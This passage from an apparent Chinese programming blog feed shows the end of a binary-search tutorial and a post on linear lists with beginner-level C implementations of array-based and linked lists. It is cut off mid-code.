class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NotFound 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Position ;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span><br>&#123;<br>ElementType Data[MAXSIZE];<br>Position Last;<br>&#125;;<br><br><span class="hljs-function">List <span class="hljs-title">CreatList</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">Position <span class="hljs-title">BinarySearch</span><span class="hljs-params">(List ,ElementType X)</span></span>;<br><br><span class="hljs-function">List <span class="hljs-title">CreatList</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L;<br>L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L-&gt;Last = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><span class="hljs-function">Position <span class="hljs-title">BinarySearch</span><span class="hljs-params">(List L,ElementType X)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> left = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> right = L-&gt;Last;<br><span class="hljs-keyword">while</span>(left &lt; right)<br>&#123;<br><span class="hljs-type">int</span> center = (left+right) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(X &gt; L-&gt;Data[center])<br>&#123;<br>left = center + <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(X &lt; L-&gt;Data[center])<br>&#123;<br>right  = center - <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> center;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> NotFound;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L;<br>ElementType X;<br>Position P;<br><br>L = <span class="hljs-built_in">CreatList</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt; <span class="hljs-number">4</span>;++ i)<br>&#123;<br>L-&gt;Data[i] = <span class="hljs-number">2</span> * i - <span class="hljs-number">1</span>;<br>&#125;<br>L-&gt;Last = <span class="hljs-number">3</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;X);<br>P = <span class="hljs-built_in">BinarySearch</span>(L,X);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,P);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="综上所述："><a href="#综上所述：" class="headerlink" title="综上所述："></a>综上所述：</h2><p><strong>其实二分只有一种，每次写的时候想象你设计的夹子的样子，脑补那个死循环的样子，不变应万变了。</strong><br><img src="/dong.github/images/0907-2.jpg"><br><strong>好了，现在理解了整数二分，那么二分答案、实数二分、三分……也就不难了，后续在本文中补齐。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二分</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-线性表</title>
    <link href="/dong.github/2024/09/06/Datastructures-%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/dong.github/2024/09/06/Datastructures-%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>线性表的数组和链表实现，以及线性表拓展。</strong></p><span id="more"></span><p><strong>这里第一个难点就是理解指针是什么，指针是什么呢？</strong><br><strong>线性表，像数组吧，数组和链表是它的两种实现方式。</strong><br><strong>数组存：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100  <span class="hljs-comment">// MAXSIZE 定义为 Data 数组的大小</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;  <span class="hljs-comment">// ElementType 可定义为任意类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List; <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br>   ElementType Data[MAXSIZE]; <br>   <span class="hljs-type">int</span> Last;  <span class="hljs-comment">// Last 定义线性表的最后一个元素</span><br>&#125;;<br>List L;<br><span class="hljs-comment">//访问下标为 i 的元素：L-&gt;Data[i]</span><br><span class="hljs-comment">//线性表的长度：L-&gt;Last+1</span><br><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//初始化顺序表 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>; <span class="hljs-comment">//查找 X 第一次出现的下标 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>; <span class="hljs-comment">//在下标为 i 的地方插入 X </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>;   <span class="hljs-comment">//删除下标为 i 的当前值 </span><br><span class="hljs-function">ElementType <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>;  <span class="hljs-comment">//返回下标为 K 的当前值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>;  <span class="hljs-comment">//返回顺序表的长度 </span><br> <br><span class="hljs-comment">//初始化 </span><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>&#123;<br>    List L;<br>    L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>    L-&gt;Last = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> L;<br>&#125;<br><br><span class="hljs-comment">// 按值查找 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= L-&gt;Last &amp;&amp; L-&gt;Data[i] != X)  <br>        i++;<br>    <span class="hljs-keyword">if</span>(L-&gt;Last &lt; i)  <span class="hljs-comment">//如果没找到，返回 -1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <br>    <span class="hljs-keyword">else</span>    <span class="hljs-comment">// 找到后返回下标 </span><br>        <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">// 插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>(L-&gt;Last == MAXSIZE<span class="hljs-number">-1</span>)&#123;  <span class="hljs-comment">//位置已满 </span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;表满&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">0</span> || L-&gt;Last<span class="hljs-number">+1</span> &lt; i)&#123;  <span class="hljs-comment">//位置越界，如果将数插入 L-&gt;Data[L-&gt;Last+1]，下面都不用腾位置了 </span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;位置不合法&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=L-&gt;Last;j&gt;=i;j--)   <span class="hljs-comment">// 从后往前依次向后挪一个，给 a[i]腾出位置     </span><br>        L-&gt;Data[j<span class="hljs-number">+1</span>] = L-&gt;Data[j];   <br>    L-&gt;Data[i] = X;    <span class="hljs-comment">//新元素插入</span><br>    L-&gt;Last++;    <span class="hljs-comment">// Last仍然指向最后元素</span><br>    <span class="hljs-keyword">return</span>;<br>&#125; <br><br><span class="hljs-comment">//删除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">0</span> || L-&gt;Last &lt;i)&#123;  <span class="hljs-comment">//位置越界，而删除最多到 L-&gt;Data[L-&gt;Last]</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;L-&gt;Data[%d]不存在元素&quot;</span>,i);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">+1</span>;j&lt;=L-&gt;Last;j++)   <span class="hljs-comment">// 从前往后依次向前挪一个，将 a[i] 覆盖了 </span><br>        L-&gt;Data[j<span class="hljs-number">-1</span>] = L-&gt;Data[j];<br>    L-&gt;Last--;  <span class="hljs-comment">// Last仍然指向最后元素</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 按序查找</span><br><span class="hljs-function">ElementType <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>&#123;<br><span class="hljs-keyword">if</span>(K &lt; <span class="hljs-number">0</span> || L-&gt;Last &lt; K)&#123;  <span class="hljs-comment">//位置越界</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;L-&gt;Data[%d]不存在元素&quot;</span>,K);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> L-&gt;Data[K];<br>&#125;<br><br><span class="hljs-comment">//表长</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>&#123;<br><span class="hljs-keyword">return</span> L-&gt;Last<span class="hljs-number">+1</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L = <span class="hljs-built_in">MakeEmpty</span>();<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入11\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">25</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入25\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入33\n&quot;</span>);<br><span class="hljs-built_in">Insert</span>(<span class="hljs-number">77</span>,<span class="hljs-number">0</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在线性表L-Data[0]插入77\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时的线性表为：&quot;</span>); <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">Length</span>(L);i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;Data[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查找值为12的下标是：%d\n&quot;</span>,<span class="hljs-built_in">Find</span>(<span class="hljs-number">12</span>,L));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;下标为3的线性表的值是：%d\n&quot;</span>,<span class="hljs-built_in">FindKth</span>(<span class="hljs-number">3</span>,L));<br><span class="hljs-built_in">Delete</span>(<span class="hljs-number">2</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除线性表中下标为2的元素\n&quot;</span>);<br><span class="hljs-built_in">Delete</span>(<span class="hljs-number">2</span>,L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除线性表中下标为2的元素\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时的线性表为：&quot;</span>); <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">Length</span>(L);i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;Data[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><p><strong>链表：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType; <span class="hljs-comment">// ElementType 可定义为任意类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br>ElementType Data;   <span class="hljs-comment">//数据域 </span><br>List Next;   <span class="hljs-comment">// 下一个链表的地址 </span><br>&#125;; <br>List L;<br><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//初始化链表 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>;  <span class="hljs-comment">// 以遍历链表的方法求链表长度 </span><br><span class="hljs-function">List <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>;  <span class="hljs-comment">// 按序号查找 </span><br><span class="hljs-function">List <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>;  <span class="hljs-comment">// 按值查找 </span><br><span class="hljs-function">List <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>;  <span class="hljs-comment">//将 X 插入到第 i-1(i&gt;0) 个结点之后 </span><br><span class="hljs-function">List <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>; <span class="hljs-comment">// 删除第 i(i&gt;0) 个结点 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>; <span class="hljs-comment">// 输出链表元素 </span><br><br><span class="hljs-comment">// 初始化链表 </span><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><br><span class="hljs-comment">//求表长 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-type">int</span> len=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(p)&#123;  <span class="hljs-comment">// 当 p 不为空 </span><br>p = p-&gt;Next;<br>len++;<br>&#125;<br><span class="hljs-keyword">return</span> len;<br>&#125; <br><br><span class="hljs-comment">// 按序查找 </span><br><span class="hljs-function">List <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;  <span class="hljs-comment">//从 1 开始 </span><br><span class="hljs-keyword">while</span>(p &amp;&amp; i&lt;K)&#123;<br>p = p-&gt;Next;<br>i++;<br>&#125;<br><span class="hljs-keyword">if</span>(i == K)    <span class="hljs-comment">// 找到了 </span><br><span class="hljs-keyword">return</span> p;<br><span class="hljs-keyword">else</span>    <span class="hljs-comment">// 未找到 </span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125; <br><br><span class="hljs-comment">// 按值查找  </span><br><span class="hljs-function">List <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>&#123;<br>List p = L;<br><span class="hljs-keyword">while</span>(p &amp;&amp; p-&gt;Data!=X)<br>p = p-&gt;Next;<br><span class="hljs-comment">// 找到了，返回 p</span><br><span class="hljs-comment">// 未找到，返回 NULL，此时 p 等于 NULL </span><br><span class="hljs-keyword">return</span> p;   <br>&#125; <br><br><span class="hljs-comment">/* 插入</span><br><span class="hljs-comment">1. 用 s 指向一个新的结点</span><br><span class="hljs-comment">2. 用 p 指向链表的第 i-1 个结点 </span><br><span class="hljs-comment">3. s-&gt;Next = p-&gt;Next，将 s 的下一个结点指向 p 的下一个结点 </span><br><span class="hljs-comment">4. p-&gt;Next = s，将 p 的下一结点改为 s   */</span><br><span class="hljs-function">List <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>List p,s;<br><span class="hljs-keyword">if</span>(i == <span class="hljs-number">1</span>)&#123;     <span class="hljs-comment">// 新结点插入在表头 </span><br>s = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>s-&gt;Data = X;<br>s-&gt;Next = L;<br><span class="hljs-keyword">return</span> s;     <span class="hljs-comment">//插入的结点为头结点 </span><br>&#125;<br>p = <span class="hljs-built_in">FindKth</span>(i<span class="hljs-number">-1</span>,L);   <span class="hljs-comment">// 找到第 i-1 个结点</span><br><span class="hljs-keyword">if</span>(!p)&#123;   <span class="hljs-comment">// 第 i-1 个结点不存在 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;结点错误&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>s = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>s-&gt;Data = X;<br>s-&gt;Next = p-&gt;Next;   <span class="hljs-comment">//将 s 的下一个结点指向 p 的下一个结点 </span><br>p-&gt;Next = s;   <span class="hljs-comment">// 将 p 的下一结点改为 s</span><br><span class="hljs-keyword">return</span> L;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* 删除</span><br><span class="hljs-comment">1. 用 p 指向链表的第 i-1 个结点 </span><br><span class="hljs-comment">2. 用 s 指向要被删除的的第 i 个结点</span><br><span class="hljs-comment">3. p-&gt;Next = s-&gt;Next，p 指针指向 s 后面</span><br><span class="hljs-comment">4. free(s)，释放空间 </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">List <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>List p,s;<br><span class="hljs-keyword">if</span>(i==<span class="hljs-number">1</span>)&#123;   <span class="hljs-comment">//如果要删除头结点 </span><br>s = L;<br><span class="hljs-keyword">if</span>(L)   <span class="hljs-comment">// 如果不为空 </span><br>L = L-&gt;Next;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">free</span>(s);   <span class="hljs-comment">// 释放被删除结点 </span><br><span class="hljs-keyword">return</span> L; <br>&#125;<br>p = <span class="hljs-built_in">FindKth</span>(i<span class="hljs-number">-1</span>,L);    <span class="hljs-comment">// 查找第 i-1 个结点</span><br><span class="hljs-keyword">if</span>(!p || !(p-&gt;Next))&#123;     <span class="hljs-comment">// 第 i-1 个或第 i 个结点不存在 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;结点错误&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>s = p-&gt;Next;    <span class="hljs-comment">// s 指向第 i 个结点 </span><br>p-&gt;Next = s-&gt;Next;  <span class="hljs-comment">//从链表删除 </span><br><span class="hljs-built_in">free</span>(s);  <span class="hljs-comment">// 释放被删除结点 </span><br><span class="hljs-keyword">return</span> L;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 输出链表元素 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>&#123;<br>List t;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前链表为：&quot;</span>);<br><span class="hljs-keyword">for</span>(t = L;t;t =t-&gt;Next)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>,t-&gt;Data);<br>flag = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(flag)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>L = <span class="hljs-built_in">MakeEmpty</span>();<br><span class="hljs-built_in">Print</span>(L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">25</span>,<span class="hljs-number">1</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">33</span>,<span class="hljs-number">2</span>,L);<br>L = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">77</span>,<span class="hljs-number">3</span>,L);<br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前链表长度为：%d\n&quot;</span>,<span class="hljs-built_in">Length</span>(L));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;此时链表中第二个结点的值是：%d\n&quot;</span>,<span class="hljs-built_in">FindKth</span>(<span class="hljs-number">2</span>,L)-&gt;Data);<br><span class="hljs-built_in">printf</span>(<span 